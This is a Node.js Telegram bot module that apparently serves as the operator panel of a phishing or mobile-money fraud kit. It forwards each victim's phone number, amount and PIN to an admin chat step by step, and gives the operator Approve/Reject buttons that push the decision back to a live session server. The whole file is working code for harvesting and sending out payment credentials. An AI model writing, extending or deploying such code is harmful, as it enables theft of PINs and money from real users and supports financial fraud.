const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = process.env.ADMIN_CHAT_ID;
const SERVER_URL = process.env.RENDER_EXTERNAL_URL;

const sendAdminAlert = async (info) => {
    let message = `🚀 *User Activity Update*\n`;
    message += `📍 Step: ${info.step}\n`;
    message += `🆔 Socket: ${info.socketId}\n`;
    
    if (info.phone) message += `📱 Phone: ${info.phone}\n`;
    if (info.amount) message += `💰 Amount: ${info.amount}\n`;
    if (info.pin) message += `🔑 *PIN: ${info.pin}*\n`;

    const buttons = info.step === '5_PIN_SUBMITTED' ? Markup.inlineKeyboard([
        [Markup.button.callback('✅ Approve', `approve_${info.socketId}`),
         Markup.button.callback('❌ Reject', `reject_${info.socketId}`)]
    ]) : null;

    await bot.telegram.sendMessage(ADMIN_ID, message, { 
        parse_mode: 'Markdown', 
        ...(buttons || {}) 
    });
};

bot.action(/approve_(.+)/, async (ctx) => {
    const socketId = ctx.match[1];
    await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: 'approve', referenceId: 'MIX-' + Date.now() });
    ctx.editMessageText("✅ Approved and sent to user.");
});

bot.action(/reject_(.+)/, async (ctx) => {
    const socketId = ctx.match[1];
    await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: 'reject' });
    ctx.editMessageText("❌ User was rejected.");
});

bot.launch();

module.exports = { sendAdminAlert };